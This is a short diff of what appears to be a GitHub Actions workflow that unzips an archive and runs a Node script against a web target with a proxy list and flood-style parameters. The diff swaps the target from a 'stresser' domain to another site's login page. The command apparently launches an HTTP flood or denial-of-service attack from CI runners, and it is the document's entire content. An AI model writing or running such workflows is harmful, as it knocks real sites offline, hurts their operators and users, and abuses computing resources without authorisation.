@@ -35,7 +35,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node a.js GET https://destroyerrealstresser.pro/liwy 300 4 90 proxy.txt --bfm --full        
+          node a.js GET https://destroyerreal.tech/login 300 4 90 proxy.txt --bfm --full        
           
           
 
